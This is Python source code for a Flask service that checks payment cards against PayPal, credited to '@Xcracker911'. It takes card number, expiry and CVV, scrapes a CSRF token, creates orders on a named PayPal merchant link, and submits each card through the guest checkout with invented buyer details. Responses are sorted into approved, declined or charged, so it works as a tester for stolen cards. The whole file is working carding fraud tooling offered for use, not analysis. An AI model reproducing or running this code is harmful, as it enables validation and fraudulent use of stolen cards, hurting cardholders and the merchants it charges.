import requests
import json
import logging
import re
import time
from flask import Flask, jsonify, request

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
app = Flask(__name__)

APPROVED_CODES = {"INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED"}
DECLINED_CODES = {
    "CARD_GENERIC_ERROR", "COUNTRY_NOT_SUPPORTED", "EXPIRED_CARD", "VALIDATION_ERROR",
    "LOGIN_ERROR", "RISK_DISALLOWED", "TOKEN_EXTRACTION_ERROR", "NETWORK_ERROR",
    "INTERNAL_ERROR", "INVALID_MONTH", "UNKNOWN_ERROR"
}

def get_csrf(html):
    patterns = [
        r'"csrfToken":"([^"]+)"',
        r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']',
        r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']',
        r'data-csrf=["\']([^"\']+)["\']',
        r'"token":"([^"]+)"',
        r'name="_token"\s+value="([^"]+)"'
    ]
    for p in patterns:
        match = re.search(p, html)
        if match: return match.group(1)
    return None

def paypal_payment(card_string, amount="1.00"):
    start = time.time()
    
    parts = card_string.split('|')
    if len(parts) != 4:
        return error_response("DECLINED|VALIDATION_ERROR: R_ERROR-0.01", amount, start)
    
    card_num, mm, yy, cvv = [p.strip() for p in parts]
    
    if not mm.isdigit() or len(mm) != 2 or not (1 <= int(mm) <= 12):
        return error_response("DECLINED|INVALID_MONTH: R_ERROR-0.01", amount, start)
    
    if not yy.isdigit(): return error_response("DECLINED|VALIDATION_ERROR: R_ERROR-0.01", amount, start)
    if len(yy) == 2: yy = '20' + yy
    elif len(yy) != 4: return error_response("DECLINED|VALIDATION_ERROR: R_ERROR-0.01", amount, start)
    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        return error_response("DECLINED|VALIDATION_ERROR: R_ERROR-0.01", amount, start)

    exp_date = f"{mm}/{yy}"
    card_type = 'VISA' if card_num.startswith('4') else 'MASTER_CARD' if card_num.startswith('5') else 'AMEX' if card_num.startswith('3') else 'UNKNOWN'
    conv_type = 'VENDOR' if card_type == 'AMEX' else 'PAYPAL'
    card_data = {'cardNumber': card_num, 'type': card_type, 'expirationDate': exp_date, 'securityCode': cvv, 'postalCode': '10010'}

    s = requests.Session()
    token = None
    
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    
    for acq_retry in range(3):
        csrf_token = None
        for csrf_retry in range(3):
            headers = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml', 'Accept-Language': 'en-US,en;q=0.9'}
            try:
                r = s.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', headers=headers, timeout=15)
                r.raise_for_status()
                csrf_token = get_csrf(r.text)
                if csrf_token: break
            except: pass
            if csrf_retry < 2: time.sleep(2)

        if not csrf_token:
            if acq_retry < 2: 
                time.sleep(3)
                continue
            else:
                return error_response("DECLINED|TOKEN_EXTRACTION_ERROR: R_ERROR-0.01", amount, start)

        headers = {
            'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', 'user-agent': ua, 'x-csrf-token': csrf_token
        }
        data = {
            'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': amount,
            'currency': 'USD', 'currencySymbol': '$', 'funding_source': 'CARD', 'button_type': 'VARIABLE_PRICE'
        }
        
        try:
            r = s.post('https://www.paypal.com/ncp/api/create-order', cookies=s.cookies, headers=headers, json=data, timeout=10)
            r.raise_for_status()
            resp_data = r.json()
        except:
            if acq_retry < 2: 
                time.sleep(3)
                continue
            else:
                return error_response("DECLINED|NETWORK_ERROR: R_ERROR-0.01", amount, start)
        
        if 'context_id' in resp_data:
            token = resp_data['context_id']
            break
        else:
            if acq_retry < 2: 
                time.sleep(3)
                continue

    if not token:
        return error_response("DECLINED|TOKEN_EXTRACTION_ERROR: R_ERROR-0.01", amount, start)

    headers = {
        'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
        'paypal-client-context': token, 'paypal-client-metadata-id': token,
        'referer': f'https://www.paypal.com/smart/card-fields?token={token}', 'user-agent': ua,
        'x-app-name': 'standardcardfields', 'x-country': 'US',
    }

    gql_query = """
    mutation payWithCard($token: String!, $card: CardInput, $phoneNumber: String, $firstName: String, $lastName: String, $shippingAddress: AddressInput, $billingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) {
        approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) {
            flags { is3DSecureRequired }
            cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } }
            paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } }
        }
    }
    """
    
    gql_data = {
        'query': gql_query.strip(),
        'variables': {
            'token': token, 'card': card_data, 'phoneNumber': '4073320637', 'firstName': 'Rockcy', 'lastName': 'og',
            'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
            'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
            'email': 'rocky2@gmail.com', 'currencyConversionType': conv_type,
        }
    }
    
    try:
        r = s.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=s.cookies, headers=headers, json=gql_data, timeout=20)
        resp_data = r.json()
    except:
        return error_response("DECLINED|INTERNAL_ERROR: R_ERROR-0.01", amount, start)

    end = time.time()
    t = f"{end - start:.2f}s"
    
    code = 'TRANSACTION_SUCCESSFUL'
    if 'errors' in resp_data and resp_data['errors']:
        err = resp_data['errors'][0]
        code = err.get('data', [{}])[0].get('code', 'UNKNOWN_ERROR')
    
    status = 'APPROVED' if code in APPROVED_CODES else 'DECLINED' if code in DECLINED_CODES else 'CHARGED'
    result_str = f"{status}|{code}: R_ERROR-{amount}"
    
    return {
        'amount': amount, 'dev': '@Xcracker911', 'result': result_str, 'time': t, 'timestamp': int(time.time())
    }

def error_response(result, amount, start):
    t = f"{time.time() - start:.2f}s"
    return {'amount': amount, 'dev': '@Xcracker911', 'result': result, 'time': t, 'timestamp': int(time.time())}

@app.route('/pp')
def payment_api():
    card = request.args.get('cc', '')
    amt = request.args.get('amount', '0.01')
    last4 = card.split('|')[0][-4:] if '|' in card and len(card.split('|')[0]) >= 4 else '****'
    logging.info(f"Payment request: card ending {last4}, amount: {amt}")
    result = paypal_payment(card, amt)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
